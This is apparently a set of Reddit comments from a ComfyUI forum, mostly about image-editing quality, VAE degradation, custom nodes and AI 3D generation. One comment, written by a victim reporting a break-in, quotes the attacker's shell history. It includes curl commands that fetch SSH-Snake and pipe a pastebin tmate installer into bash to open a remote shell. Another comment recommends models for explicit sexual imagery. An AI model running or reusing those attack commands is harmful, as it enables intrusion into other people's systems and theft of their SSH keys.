But it's much slower. At the same time 9b base renders an image with 20 or so steps, I can do 2-3 smaller edits with 4b distilled, multiple edits chained after another or just do quicker edit-generate turns overall. And if you don't overload 4b with too many editing instructions at once, it's pretty capable as I see. 4b seems to struggle with text rendering a bit though.",

I'm still very new to ComfyUI (I usually just do 3D/Unity stuff), but I really wanted to port a personal tool I made into ComfyUI to streamline my workflow.\n\nI originally created this tool as a website to help me self-study cinematic shots, specifically to memorize what different camera angles, lighting setups (like Rembrandt or Volumetric), and focal lengths actually look like (link to the original tool : [https://yedp123.github.io/](https://yedp123.github.io/)).\n\n**What it does:** It replaces the standard CLIP Text Encode node but adds a visual interface. You can select:\n\n* Camera Angles (Dutch, Low, High, etc.)\n* Lighting Styles\n* Focal Lengths & Aperture\n* Film Stocks & Color Palettes\n\nIt updates the preview image in real-time when you hover over the different options so you can see a reference of what that term means before you generate. You can also edit the final prompt string if you want to add/remove things. It outputs the string + conditioning for Stable Diffusion, Flux, Nanobanana or Midjourney.\n\nLike I mentioned above, I just started playing with ComfyUI so I am not sure if this can be of any help to any of you or if there are flaws with it, but here's the link if you want to give it a try. Thanks, Have a good day!\n\n**Links:** [https://github.com/yedp123/ComfyUI-Cinematic-Prompt](https://github.com/yedp123/ComfyUI-Cinematic-Prompt)\n\n***-----------------------------------------------------------------------------------------***\n\n***UPDATE: added \"Cinematic Reference Loader\", an Image Loader node which lets the user select an image among the image assets to use for Image-to-Image workflows***",

The node doesn't currently have an `IMAGE` output to send them directly to other nodes via wires.\n\nHowever, if you really like a specific reference image (like the \"Low Angle\" shot for instance) and want to use it for ControlNet, you can find all the source images in your `custom_nodes/ComfyUI_Cinematic_Prompt/web/assets/` folder and load them into a standard 'Load Image' node",

English isn’t my first language, but I hope I explained it clearly.",

You got your smut that does boring shit well. You got your smut that does prompt adherence well (but doesn't beat the boring models at boring shit.)\n\nThe video part is easy. Smutty fine-tunes of Wan2.2 will get any image moving and grooving. Wan 2.2 Enhanced NSFW is number 1 on civitas for a reason. It's the best. Image-to-Image will get you to where ever you want to go, so the problem is thus reduced to an image (de)generation problem.\n\nFor photoreal image smut, you can use Flux or Qwen or Z-Image probably. They will all give you exactly what you want as long as you plug in the right LoRA and are willing to settle for something that is mostly 1girl.\n\nFor anime image smut, a lot of people seem to go for Illustrious or Pony. If you're willing to settle for something mostly 1girl, these models will also trivially do anything you'd ever want.\n\nThe hardest thing is getting 2+ characters interacting without it looking like some horror show dreamed up by the worshippers of slaanesh. The state of the AI art today is that, to get two characters interacting with a lot of prompt adherence, people start sprouting extra fingers and legs and dicks. So you can either wrestle your way through that (with control nets and in-painting and a lot of random chance) or settle for something more generic.",

There are plenty available at Civit but IMO many of the best ones were deleted. Fortunately, you can still find most of them here...\n\nIt's the loras that turn Wan2.2 from PG-13/softcore into XXX hardcore.\n\n[https://civitaiarchive.com/](https://civitaiarchive.com/)\n\nThe only problem with the photorealistic models currently is that none of them go as easily hardcore as Pony or Illustrious. There ARE mixes for realism and they'll get you most of the way there, but they do not look 100% real or like photos.\n\nBut they will create the most hardcore scenes you can probably imagine. Excellent at anatomy in complex positions of \"interactions\" that none of the truly photorealistic models can manage. They weren't trained specifically on porn - Pony was. Skip Pony 7 entirely. In fact you don't want to use ANY of the Pony base models. You want a Pony finetune.\n\nI'd recommend CyberRealisticPony and there are a few others. You can create hardcore XXX with this model. It's fast, has great anatomy and is HIGHLY knowledgeable about practically every sexual act or position you could want, and I love it! But it's NOT quite photorealism.\n\nChroma is an interesting one. It's a photorealistic model that WAS trained on porn. It exists as a halfway point. Not quite as hardcore as Pony can get but way more \"knowledgeable\" than Qwen or Z-Image Turbo. Its main drawback is sketchy anatomy compared to the others. It CAN do amazing things, but you'll ALSO get a lot of deformities. A lot of almost perfect pics ruined by that deformed foot or extra hand etc. And then BAM... exactly what you were going for.\n\nFor anime smut, you'll have to ask someone else :)",

In fact increasing the steps decreases the likeness of the person.\n\nIt's best if your input image is high resolution (higher than 1024x1024) and it's also good if your output resolution is high too. At first I was trying with 1024x1024 and was getting some good results and some bad. I upped my output resolution to 1440x1440 or 1920x1080 and found the likeness was matching a LOT more often.\n\nIt's possible that a Q5 quant is degrading the likeness but I don't know that. Also, the Q5 quants you linked to are of version 9, so quite a bit older than the latest v22.\n\nI can say that v20 works very well and some have said that v18 maintains likeness the best.\n\nI was able to find Q5 quants of the newer versions for you. Try one of these, and good luck...\n\n[https://huggingface.co/Arunk25/Qwen-Image-Edit-Rapid-AIO-GGUF/tree/main](https://huggingface.co/Arunk25/Qwen-Image-Edit-Rapid-AIO-GGUF/tree/main)",

Keep that in mind and look at the comments/ratings on Civit as they give you an idea of which versions perform better.\n\nIf you're looking for true customization, I would recommend a pipeline of samplers, not just one model. Since each model excels at something unique, you should start with the model that gives you the pose/camera you want, then send the image to the next ksampler/advanced ksampler to give you color/lighting, and hook the depth map of the first image into it so it keeps the same shape, then send that image with its depth map to the next ksampler which can provide the texture/details (I like Z-image for this step).\n\nThat's just an example, you can invent any pipline you want with each step adding something the previous model couldn't.",

Below is a bunch of comparisons between input image and 8x trips through a VAE encode/decode cycle (scroll to zoom in):\n\n[Here is a robot](https://imgsli.com/NDQ0NjY3).\n\n[Here is an anime creature.](https://imgsli.com/NDQ0NjY4)\n\n[Here is a random demon woman](https://imgsli.com/NDQ0Njcy).\n\n[Here is a Fernando Alonso](https://imgsli.com/NDQ0Njcx).\n\n[Here is a lower resolution Fernando Alonso](https://imgsli.com/NDQ0Njgy).\n\nYour methodology isn't great because you are running a single 1080 x 1935 image through the VAE so the loss of detail is much less noticeable. When you run a 1 megapixel image through the same process (like you would with image editing, for example) the degradation is much more apparent. Even if the the colors remain basically the same, the destruction of details is too much to be dismissed as a \"slight fading effect\". \n\n---\n\n>It's some sort of groupthink, when no-one actually tested it.\n\nOkay, let's test it. I'll create an image from two inputs, and run 8 edits on consecutive outputs. \n\n[Here](https://i.postimg.cc/dJvcwHqW/grid-00027.png) I make all edits directly with latents, so it was only one encode/decode cycle. 0 Degradation.\n\n[Here](https://i.postimg.cc/R472s7cq/grid-00028.png) I make all edits with images in an encode/decode cycle, changing the seed each prompt. Nothing super noticeable, if at all. There might be if I had static elements that are supposed to remain untouched by the model. Test that next.\n\n[Here](https://i.postimg.cc/dwYxyhz0/grid-00029.png) I make all edits with images in an encode/decode cycle and keep the seed static. There are tons of errors, and they compound from one gen to the next. The wings and midsection are the most noticeable, but there are errors all over the place. So, I can confidently say leaving the seed static from gen to gen will fuck up your image. Now lets test that VAE cycle.\n\n---\n\n[Here](https://i.postimg.cc/rcC97QPW/vae-00001.png) is a run of edits using the VAE.\n\n[Here](https://i.postimg.cc/tytz82M6/vaeless-00001.png) is a run of edits using only latents.\n\nBoth of these runs are the exact same seed, exact same prompts. The differences are subtle, but the result is clear. [Here is the final output](https://imgsli.com/NDQ0NzAw). \n\nCompare the detail on the house and the tree above it on the mug. Every edit had a clear instruction: \"Leave the coffee mug exactly as it is.\" And it did, but the VAE got in the way and degraded the details.\n\nSo yeah, it was some sort of \"groupthink\", but the group was thinking based on knowledge gained over years of doing this. The color degradation was likely based on an unchanging seed, but passing into and out of latent space will still fuck up your image so it's best to avoid it as much as possible. \n\nEven a VAE as good as the Flux2 Vae will fuck up your image with enough cycles, because the tiny mistakes compound with each other. If I ran that mug through ten more edits the results would be even more stark. That's also why you mask when you inpaint, otherwise your final result ends up like mud.",

My suspicion is that Flux has a built-in corrector that works “well” on the first pass but then accumulates over subsequent passes. The problem is that it seems to be applied only to unchanged areas, so ideally your correction pass should also target only those areas.\n\nHave you tried whether the same behavior happens with img2img without inpainting? Did you keep the same seed on each pass, or did you change it? In any case, it’s usually best to do your generation first, then crop and stitch the original background back into the image using the same mask, and only then proceed with the next pass.",

Image → Latent (VAE Encode) is a lossy operation.\n\nSo it’s kinda obvious that if you repeatedly chain multiple VAE encode + VAE decode operations, you will eventually lose more and more information. At the same time, you start “saturating” specific patterns that the VAE is good at resolving and encoding. As a result, overall quality degrades, and the image becomes more and more sharp, contrasty, and “AI-looking” in the end.\n\nIt doesn’t matter what tricks you do between those operations - once you keep re-encoding, you are inevitably losing original information.",

For instance, if a large portion of the image is occupied by a person wearing a white T-shirt and you change it to black, the overall color balance of the image shifts. Reflections, lighting, and even the camera’s exposure or white balance adapt to the new mid-gray of the scene.   As example looking at the arm, the upper part should show a different light reflection, but it doesn’t. For me, that means using masking along with a low-percentage blend of the unmasked areas could be sufficient.",

This could make the issue a bit tricky to resolve. I will uplode the node to the TBG Takeaways : The TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and compression noise. \n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager.

I’ve been lurking and learning here for a while, and I honestly couldn't have pulled this off without the incredible nodes, workflows, and troubleshooting tips shared by everyone here.\n\nI recently had the chance to integrate ComfyUI into a \"real-world\" professional production for **La Centrale** (a major French automotive marketplace), working alongside agencies BETC and Bloom.\n\n**The challenge:** We had to bring a saga of 25 custom-designed cars to life for over 10 different commercials in a very tight 4-week window.\n\nhttps://reddit.com/link/1qhuqwr/video/vhhgg7rajgeg1/player\n\n**The process:** To meet the brand's high standards, I deployed a hybrid pipeline: **3D for the structure/consistency and ComfyUI for the design, textures, and realism.** This allowed us to stay incredibly agile while maintaining a level of detail that traditional 3D alone wouldn't have reached in that timeframe.\n\nIt’s definitely not \"perfect,\" and there’s always room for improvement, but it’s a solid proof of concept that our workflows are ready for high-stakes professional advertising.\n\nThanks again for being such an inspiring hub of innovation. This is only the beginning! 🍿💥\n\n*(If anyone is curious about the specific nodes or how I handled the 3D-to-AI pass to keep the cars consistent, I’m happy to answer questions in the comments!)*\n\nmore details about this project : [https://www.surrendr.studio/work/la-centrale-ai](https://www.surrendr.studio/work/la-centrale-ai)  \n",

I was able to see all the commands the attacker ran on my system by viewing my .bash_history file, some of which were these:\n\n    apt install net-tools\n    curl -sL https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh -o snake_original.sh\n    TMATE_INSTALLER_URL=\"https://pastebin.com/raw/frWQfD0h\"\n    PAYLOAD=\"curl -sL ${TMATE_INSTALLER_URL} | sed 's/\\r$//' | bash\"\n    ESCAPED_PAYLOAD=${PAYLOAD//|/\\\\|}\n    sed \"s|custom_cmds=()|custom_cmds=(\\\"${ESCAPED_PAYLOAD}\\\")|\" snake_original.sh > snake_final.sh\n    bash snake_final.sh 2>&1 | tee final_output.log\n    history | grep ssh\n\nBasically looking for SSH keys and other systems to get into. They found my keys but fortunately all my recent SSH access was into a tiny server hosting a personal vibe coded game, really nothing of value. I shut down that server and disabled all access keys. Still assessing, but this is scary shit.\n\n**UPDATE 2**\n\nAccording to Claude, the most likely attack vector was the custom node **[comfyui-easy-use](https://github.com/yolain/ComfyUI-Easy-Use)**. Apparently there is the capability of remote code execution in that node. Not sure how true that is, I don't have any paid versions of LLMs. \n\nMore importantly, I did some dumb shit to allow this. I always start comfyui with the --listen flag, so I can check on my gens from my phone while I'm elsewhere in my house. Normally that would be restricted to devices on your local network, but separately, apparently I enabled DMZ host on my router for my PC. If you don't know, DMZ host is a router setting that basically opens every port on one device to the internet. This was handy back in the day for getting multiplayer games working without having to do individual port forwarding; I must have enabled it for some game at some point. This essentially opened up my comfyui to the entire internet whenever I started it... presumably there are people out there just scanning IP ranges for port 8188 looking for victims, and they found me. \n\n**Lesson: Do not use the --listen flag in conjunction with DMZ host!**",

It establishes a secure tunnel from a local machine to the internet, allowing others to access that specific terminal remotely via SSH or a web browser.\n\n2. Breakdown of the Log\nThe \"Proxy\" Phase: The script first tried to download the necessary archive (the tmate binary) using a proxy, likely to bypass firewalls or network restrictions.\n\n✅ TMATE READY: This means the program is now running and the tunnel is open.\n\nSSH Address: This is a direct command someone can paste into their terminal to take full control of that command line.\n\nWEB URL: This is a read/write link that allows anyone with the URL to view or interact with the terminal through a browser.\n\n3. Why is this used?\nLegitimate Use: Developers use it for remote pair programming or debugging code running on a remote server that doesn't have a public IP address.\n\nSecurity Risk: If you did not initiate this, this is a major red flag. This is a common technique used by hackers to establish a \"Reverse Shell.\" It gives them a permanent backdoor into the system to execute commands, steal data, or install malware.\n\n\n\nScrub your pc man, they installed some shit. do not use your pc you dont know what that package was or if it is sending them your files, shut down and wipe save nothing. \n\nyou clearly installed a node that was compromised and ran some malicious shit.",

Here’s the framework I use to generate the style prompts:\n\n# 🤖 Agent System Prompt: Visual Essence Extractor\n\n**1. Role Definition** You are a premier Visual Arts Analyst and Prompt Engineering Specialist. Your mission is to deeply deconstruct the **\"Visual DNA\"** of an input image and translate it into a high-purity English Style Prompt for use in Stable Diffusion, Midjourney, or ComfyUI style transfer workflows.\n\n**2. Analytical Framework (Internal Scan)** When an image is provided, strictly analyze it across these five dimensions (do not output the analysis process, only the results):\n\n* **Artistic Medium & Technique:** e.g., Oil painting, digital 3D render, Ukiyo-e, cyberpunk photography, charcoal sketch.\n* **Color Palette & Harmony:** e.g., Monochromatic, complementary teal and orange, muted earth tones, neon-saturated.\n* **Lighting & Atmosphere:** e.g., Volumetric fog, cinematic rim lighting, high-key, soft bokeh, moody chiaroscuro.\n* **Texture & Grain:** e.g., Grainy film texture, thick impasto brushstrokes, glossy plastic, hyper-detailed skin pores.\n* **Artistic Influence/Era:** e.g., Studio Ghibli style, 1970s vintage aesthetic, brutalist architecture style.\n\n**3. Output Constraints**\n\n* **Direct Output:** Strictly NO preamble (e.g., \"Based on the image...\"), NO conclusions, and NO explanations.\n* **Language:** Must use pure, idiomatic English keywords.\n* **Format:** Use a comma-separated list (Tag-based style) to ensure balanced weights.\n* **Distillation:** Strip away all **Subject Matter** descriptions (e.g., \"a woman,\" \"a tree\"). Keep ONLY words that describe the **Style**.\n\n**4. Execution Logic**\n\n* **Input:** \\[Image\\]\n* **Task:** Extract the stylistic DNA.\n* **Output:** ONLY the English descriptive keywords for the style. No meta-talk.\n\n**🧪 Example Output:** *If inputting a cyberpunk rain-night photograph:* `Cinematic photography, cyberpunk aesthetic, rain-slicked surfaces, neon reflections, high contrast, moody teal and magenta color palette, anamorphic lens flare, sharp focus, volumetric night fog, grainy 35mm film texture, hyper-realistic, intricate urban detail.`\n\nGive it a shot and let me know if it helps your generations!",

          "text": "Everyone is correct, it's the VAE encoding/decoding that trashes it, and it's an issue with every image editing model. Even nanobanana pro will bake an image if you pass it back and forth a couple times. Unfortunately everything in the image degrades, not just the colors, so a simple color correct pass won't fix it.\n\nThere is a way to make multiple successive edits without the severe degradation, you just need to work with latents instead of images, but at the moment it's an extremely clunky process. You need to use the \"SaveLatent\" and \"LoadLatent\" nodes. \n\n[Here is a grid showing a multi-image edit](https://i.postimg.cc/c6yNgdy7/grid-00001.png) to swap a character's clothes. It is input/input/output.\n\n[And here is another grid](https://i.postimg.cc/HH5TVFFR/grid-00008.png) showing ~~7~~ 6 consecutive edits with minimal degradation.  \n\nTo use this technique, first run the first edit you want to do and save the latent and image to the same folder. This will make it easier to track which latent is which image, which will be important. It's pretty simple, and [will look like this](https://i.postimg.cc/Q8zgwFXM/Screenshot-2026-01-23-171025.png).\n\nNow the annoying part is you need to copy the latent from your/output/folder to Comfy's input folder. Make sure you copy instead of move, otherwise your image/latent name pairing will be out of sync. You'll need to do this for every successive edit you make, so if you're using windows 11 just middle click both folders to open them in new tabs in windows explorer, it will make it much easier to transfer the files.\n\nNow unpack the \"Reference conditioning\" subgraph and delete the vae encode node, and plug a \"LoadLatent\" node straight into both ReferenceLatent nodes. [It will look like this](https://i.postimg.cc/fTyNLqG3/Screenshot-2026-01-23-171144.png).\n\nImportant: You need to manually set the actual latent width and height, and the width and height of the flux2scheduler to match your input. If you feel like automating the math, Derfuu has a get latent size node, and you can combine that with math nodes to x2 the latent size to get the correct resolution. [It'll look like this](https://i.postimg.cc/nhMB3x6s/Screenshot-2026-01-23-172416.png). Then just plug the outputs into the width/height inputs.\n\nMaybe important: Change the noise seed every edit. In older models, running the same noise on the same image can burn the image extremely badly. I'm unsure if that's an issue with Klein, but better safe than sorry. \n\nNow, make your edit and save the image and latent as before. If you're happy with the image, congratulations, you're done. If you want to make further edits, simply copy-paste the correct latent from your output folder to your input, refresh comfy (just press r), and select the new input latent. Make your edit, save both image and latent, and continue, making as many edits as you want.\n\n---\n\nBefore now you've never really needed to use latents instead of images, so the user experience is awful. There's currently no preview on the latents so you're relying on explorer to see which latent corresponds to which image. The latent also has to be in the input folder, which makes it clunky to immediately switch to the new latent. \n\nI'll have a look and see if I can find a custom node pack that makes working with latents a better experience and whip up an actual workflow.

Your input image is 1536 x 2752, and the Flux2 Klein base resolution is 1 megapixel. 1536 x 2752 is 4,227,072 pixels, so you are trying to generate 2x the base resolution. \n\nFor now, bring back the scale to total pixels node and set it to 2 megapixels max. Also make sure to change the seed between generations, and that should set you up right for small edits like these. If you need to make bigger edits like putting a character in a different pose, you will likely need to drop the resolution down closer to base res. \n\nIf you want to work on the full resolution image, you'd be better off running an inpainting workflow on it, where you crop bits out of the image, make your edits on those cropped bits, and reattach. There must be a Klein inpainting workflow around somewhere, let me know if you can't find one and I'll throw one together for you.",

          "text": "Colorshifts in Diffusion + VAE workflows in ComfyUI mainly originate from three technical sources.\n\n\n1. Model capacity and reconstruction error\n\nEvery diffusion model has limited capacity to perfectly reconstruct image content. During iterative, these reconstruction errors accumulate. This becomes most visible in uniform, low-entropy regions such as pure black, gray, or white areas. The observed color shift is therefore not random noise, but the model’s inability to exactly reproduce flat tonal regions across generations.\n\n2. Inpainting and differential diffusion leakage\n\nInpainting introduces unavoidable leakage, even when differential diffusion is implemented directly within the model. Color and sharpness changes are not confined to the masked region, they also affect unmasked areas.\nEven with a fully black (0) mask, subtle changes can be observed outside the intended edit region. Increasing the number of inpainting steps amplifies this effect, causing gradual drift in color and detail both inside and near the mask boundaries.\n\n3. VAE encoding and decoding shifts\n\nVAE-induced color shifts are a well-known issue and have already been thoroughly documented. Any pixel-to-latent and latent-to-pixel conversion introduces small but cumulative deviations in color and contrast.\n\nUsing tiled VAE encoding/decoding generally produces better local color stability compared to full-frame VAE passes, especially at high resolutions. However, tiled VAEs introduce small rounding and boundary errors at tile borders. More details here : https://www.patreon.com/posts/147809146\n\nThere is only one reliable method to exactly maintain image content:\nDo not pass it through the sampler.\n\nThis makes crop-and-stitch workflows essential. Ideally, these operations should happen entirely in pixel space, using the original image data. Even a single VAE encode/decode pass alters the image, so avoiding unnecessary latent conversions is critical when preservation is required.\n\nIn the TBG ETUR Enhanced Tiled Upscaler and Refiner, these principles are fully automated:\n\t•\tCrop-and-stitch handling\n\t•\tVAE correction\n\t•\tLanpaint\n\t•\tMulti-object editing in a single pass\n\nThis allows you to modify many separate objects while keeping the background fully intact.\n\nHow it works\n\nYou can either:\n\t•\tUse the SAM segmentation nodes, or\n\t•\tManually mask all target elements\n\nPass the masks and the input image through the Upscaler and Tiler node with:\n\t•\tUpscale = None\n\t•\tPreset = Full Image\n\nThis configuration converts the workflow into an advanced inpainting pipeline, rather than a tiled upscaler.\n\nThe “ETUR Tile Overrides” node enables:\n\t•\tAutomatic prompt generation\n\t•\tPer-segment prompt assignment\n\t•\tAdditional conditioning per selected element\n\nThe Refiner then applies all modifications while preserving the background. Optionally, the background itself can be refined in the same pass if desired.\n\nThis workflow has been tested with:\n\t•\tFlux, Qwen,ZIT,SD,SDXL,CHROMA\n\t•\tFlux Inpaint\n\t•\tFlux Kontext\n\nIt has not yet been tested with Flux2 Klein, but it should work similarly. Alternatively, a manual crop-and-stitch approach can be used to achieve comparable results.\n\nCore rule\n\nNever sample content that must remain unchanged.",

You will see a color shift with every gen, but it should be only noticeable when doing more intense back-and-forth comparisons (whereas it's quite obvious here).  \n\nIn your example, after the first change you also already had some shifting / squishing of the image. This can happen sometimes, I've found it's usually a good idea to try 2-4 seeds with the same prompt and then pick the best one. You are also running at a resolution that is getting too high for Klein to handle well (1536 x 2752), and it will generally be much less stable because of that. I have generally found (although I haven't tested overly scientifically) that keeping the longest side below about 2k resolution will improve stability significantly when making changes. The model itself tends to output images that are so sharp / clear that I don't find the resolution limitation to actually be all that limiting.  \n\nNot perfect, but [here was the very first image I got](https://imgsli.com/NDQ0NTU4) when I tried with this prompt (after downloading the original PNG of your first image):  \n\n> Subject's shirt is black. Remove the subject's earrings. Remove the people from the background. Keep the subject’s pose and framing unchanged.  \n\nBecause the res is so high, you still get a little bit of squashing/stretching that's noticeable in the face. Maybe it would be perfect in a different seed if you tried a few. Hair color is slightly darker and the coffee cup also darkens slightly, but skin color stayed basically the same. There's a random out-of-focus person that got added into the background and a few other random changes, too. But not bad for literally the first try with a simple multi-change prompt.",

That approach works in a pinch, but it’s not how latent-space editing was really meant to be used within a single, continuous generation task.\n\nIn ComfyUI the standard and most efficient approach for iterative refinement is chaining KSamplers and passing the latent directly from one to the next. This keeps everything in memory, avoids file clutter, and lets you isolate each edit step cleanly.\n\nThat’s exactly what this workflow does: each KSampler handles one specific change (e.g., pose, lighting, expression), and the latent flows sequentially down the chain. You can disable all but the first group, iterate until you’re happy, lock the seed, then move on to the next stage - all without ever touching the filesystem.\n\nIt’s a bit wordy, I know, but maybe my take on this gets missed because it hasn’t been explained in enough detail.",

(My guess is, that the VAE doesn't keep the error function. I.e. a pixel change resulting in a Delta E and luminosity change of \"err\" should create after the same change in latent space also an error of \"err\". Most likely the VAE wasn't trained with that constraint). But that's nothing you can do.\n* Use masking. Only allow the model to change the pixels you are allowing it to, the others are prevent from changing with a mask.\n\nWith tools like Krita AI it's very simple to mask the area that is allowed to change. With Comfy itself you need to adapt your workflow.",

Generating geometry and textures together, quickly, is a big step forward for AI-driven 3D workflows.\n\nThat said, after **15 years working as a 3D modeling and texturing artist in the VFX industry**, it’s also easy to see the current limitations.  \nTopology quality, clean shapes, and UVs are still not at a level where these assets can be dropped directly into production without additional work.\n\nIn the video, I cover:  \n• Where Trellis 2 already provides real value (prototyping, base meshes, background assets, 3D printing)  \n• Why fundamental 3D principles still matter  \n• How I see AI 3D models evolving for real production use\n\nI’m also currently **building a bridge plugin for Autodesk Maya and Blender** to make it easier to move AI-generated 3D assets from ComfyUI into real DCC workflows—focusing on practical, artist-friendly integration rather than hype.\n\nI’m **not trying to hype or dismiss AI**—just share an **honest, experience-driven perspective** for artists and studios navigating this space.\n\n▶️ Watch the full video here: [https://www.youtube.com/watch?v=r8KEuOEudlI](https://www.youtube.com/watch?v=r8KEuOEudlI)  \n🔧 Workflows used in the video: [https://github.com/ArcticLatent/ComfyUI-TRELLIS2/tree/main/workflows](https://github.com/ArcticLatent/ComfyUI-TRELLIS2/tree/main/workflows)  \n🎬 My professional VFX work (if you are interested): [https://vimeo.com/1044521891](https://vimeo.com/1044521891)",

I worked in 3D many years ago and I sometimes return to it when I need a quick reference for illustration or painting. I skimmed your video and I can clearly see how this is a huge boon to 3D animation. In some ways, I'm glad that I left that career.\n\nWhen I was a student in the 1990s, 3D was new. We constantly worked very hard trying to do the simplest things like flowing water or animating a figure. Countless hours were spent trying to achieve an effect. And then the following year a new app or update was released and what used to take an extreme amount of time would now take no time at all. The innovations were both welcome and frustrating. I think back on the months of time that are lost forever. Time I could have spent doing ANYTHING else.\n\nI realized that trying to do cutting edge animation was pointless unless I worked with a massive crew of people. I never liked the idea of working for a company and work for peanuts making animated toothbrushes. I had my own ideas. And I could see the trajectory: what once took a crew of a dozen could eventually be done by one person in the same amount of time. I became disillusioned. I no longer wanted to spend all my time trying to make animations when production would be so much easier in the near future. So I quit and returned to traditional fine art, sketching, and illustration.\n\nAs time went by, the 3d production pipeline didn't get much simpler. Everything else except for modelling got simpler and better. I still had to spend massive amounts of time designing and building models. It looks like generative AI is proving to be useful for streamlining this aspect of animation production.\n\nWhen I first started experimenting with gen AI in 2022, I instantly saw its value and I knew I would use it as a medium for the rest of my life. It is extremely obvious to me that it is a massive upgrade to digital art and animation production. What you've demonstrated is the latest example.",

What I've tried on HuggingFace for past models worked surprisingly well considering the complexity of my test vehicles and odd viewing angle.  I was surprised it managed to approximate the basic shape.  But the detail was lacking, the mesh was a mess and awful to try to texture map.

Packed, Atlas, whatever they're called?  No other option?  If it would actually make a decent model from some complex novel style space ship or something, it might be worth the effort to retexture.

Crazy huh?\n\n>The ideal for animators would be to prompt for multi-mesh and ready- rigged 3D figures that you can drop into something like the $29 Bondware Poser 12.\n\nThat's the kicker. That's YOU and YOUR ideal, not \"ideal for animators\" as animators all have different processes.  and yes, you can do some of this with trellis and some basic understanding and learning about the process.\n\nYou're not an animator, you want to drop in rigged setups from a prompt. That's lazy and not creative. There is NOTHING wrong with it, I would love to see and enjoy your work, but when  you slap the \"I am an animator\" label on it, it's a bit icky.

To keep navigation fast, the app loads the low-res thumbnail first so you can scroll through thousands of images without waiting for the full files to decode. Once the high-res image is ready, it swaps it in. That 'quick grow' you're seeing is that transition to full resolution. Im looking into other performance solutions so that no longer happens. Meanwhile ill consider adding an option to toggle progressive loading until i find a fix!\n\nAbout the speed, the app is built to be snappy even with massive collections (have users testing it with 120k+ images successfully), so if its feeling slow it might be a bottleneck with I/O or the drive where the images are stored.
